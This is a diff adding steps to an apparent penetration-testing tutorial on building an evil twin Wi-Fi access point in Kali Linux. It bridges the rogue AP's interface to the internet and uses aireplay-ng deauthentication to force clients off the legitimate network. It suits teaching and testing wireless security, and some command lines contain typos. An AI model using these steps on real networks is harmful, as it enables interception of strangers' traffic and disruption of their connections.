@@ -127,4 +127,48 @@ where:
 ### Bridge the connection
 To allow internet traffic to flow through the rouge AP, a second network interface needs to be configured to allow traffic to seamlessly flow to any unsuspectingly connected clients.
 
+While `airbase-ng` is running, open another terminal and check for an `at0` interface.
 
+`iwconfig`
+
+```
+root@kali
+└─# iwconfig                   
+lo        no wireless extensions.
+
+wlan0mon  unassociated  ESSID:""  Nickname:"<WIFI@REALTEK>"
+          Mode:Monitor  Frequency=2.437 GHz  Access Point: Not-Associated   
+          Sensitivity:0/0  
+          Retry:off   RTS thr:off   Fragment thr:off
+          Encryption key:off
+          Power Management:off
+          Link Quality:0  Signal level:0  Noise level:0
+          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+          Tx excessive retries:0  Invalid misc:0   Missed beacon:0
+
+at0       no wireless extensions.
+```
+
+`at0` has been created, but it needs wireless extensions. This can be done by entering:
+
+```
+ip link add name ha type bridge
+
+ip link set ha up
+
+ip link set <Interface> master ha
+
+ip link set at0 master ha
+```
+
+where:   
+`<Interface>` is the interface connected to the internet (eth0 for example)
+
+Finally, the newly created interface `ha` needs to have an IP address assigned to it. This can be done using `dhclient`
+
+`dh client ha &`
+
+### Forcing clients to connect to the fake AP
+To force clients to connect to the Evil Twin AP, they need to be kicked off the legitimate AP. This can be done using `aireplay-ng` and sending de-authentication frames.
+
+`aireplay-ng -deauth 1000 -a <BSSID> wlan0mon wlan0mon -ignore-negative-one`
